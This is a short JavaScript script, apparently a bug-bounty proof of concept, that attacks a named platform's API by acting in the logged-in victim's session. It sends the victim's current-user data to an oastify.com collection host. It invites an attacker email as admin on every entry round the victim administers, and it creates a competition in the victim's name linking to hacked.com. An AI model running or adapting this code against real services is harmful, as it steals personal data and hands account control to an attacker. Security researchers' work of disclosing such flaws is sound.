const fetch = require('node-fetch');

// Task 1: Send a GET request to current-user endpoint and send the response to 'm5soiyk3qdu6wco76p3rcsoa319sxjl8.oastify.com'
fetch('https://platform.younoodle.com/api/current-user')
    .then(response => response.json())
    .then(data => {
        fetch('https://m5soiyk3qdu6wco76p3rcsoa319sxjl8.oastify.com', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(() => console.log('Response sent to Oastify successfully'))
        .catch(error => console.error('Error sending response to Oastify:', error));
    })
    .catch(error => console.error('Error fetching current user data:', error));

// Task 2: Send a GET request to current-user/roles endpoint
fetch('https://platform.younoodle.com/api/current-user/roles')
    .then(response => response.json())
    .then(data => {
        // If the admin array is not empty, send POST requests for each id
        if (data.admin && data.admin.length > 0) {
            data.admin.forEach(id => {
                const postData = {
                    email: 'hack3db0mar@wearehackerone.com'
                };
                const inviteUrl = `https://platform.younoodle.com/api/entry-rounds/${id}/admins/invite`;
                // Sending POST request
                fetch(inviteUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(postData)
                })
                .then(() => console.log(`Invitation sent for entry round ID: ${id}`))
                .catch(error => console.error(`Error sending invitation for entry round ID: ${id}`, error));
            });
        } else {
            console.log('No admin roles found.');
        }
    })
    .catch(error => console.error('Error fetching roles:', error));

// Task 3: Send a POST request to competitions endpoint
const competitionData = {
    name: 'Competition claimed',
    organization: '',
    url: 'http://hacked.com',
    organization_type_id: 1
};
fetch('https://platform.younoodle.com/api/competitions', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(competitionData)
})
.then(() => console.log('Competition created on behalf of victim successfully'))
.catch(error => console.error('Error creating competition:', error));
